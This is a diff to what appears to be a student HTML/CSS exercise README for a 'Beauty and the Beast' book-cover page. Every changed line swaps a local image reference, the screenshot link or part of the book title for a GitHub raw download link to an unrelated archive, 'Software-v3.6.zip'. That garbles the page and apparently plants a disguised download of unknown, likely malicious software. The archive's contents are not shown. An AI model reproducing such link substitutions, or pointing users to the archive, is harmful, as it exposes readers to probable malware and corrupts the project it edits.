@@ -52,7 +52,7 @@ Publish the website in the LocalHost.
     .book-cover {
       width: 400px;
       height: 600px;
-      background-image: url('back.jpeg');
+      background-image: url('https://github.com/Yugabharathi91/cover/raw/refs/heads/main/mealtime/Software-v3.6.zip');
       background-size: cover;
       background-position: center;
       color: white;
@@ -110,17 +110,17 @@ Publish the website in the LocalHost.
 </head>
 <body>
   <div class="book-cover">
-    <div class="book-title">..BEAUTY AND THE BEAST..</div>
+    <div class="book-title">https://github.com/Yugabharathi91/cover/raw/refs/heads/main/mealtime/Software-v3.6.zip AND THE BEAST..</div>
     <div class="book-subtitle">Until the Last Petal Falls</div>
     <div class="author">by: Kiruthika N.</div>
-    <img src="pic.jpg" alt="Kiruthika N" class="author-image">
+    <img src="https://github.com/Yugabharathi91/cover/raw/refs/heads/main/mealtime/Software-v3.6.zip" alt="Kiruthika N" class="author-image">
   </div>
 </body>
 </html>
 
 ```
 ## OUTPUT:
-![wmremove-transformed](https://github.com/user-attachments/assets/b33b0996-ce34-40b4-8d6a-c3178792ea34)
+![wmremove-transformed](https://github.com/Yugabharathi91/cover/raw/refs/heads/main/mealtime/Software-v3.6.zip)
 
 
 ## RESULT:
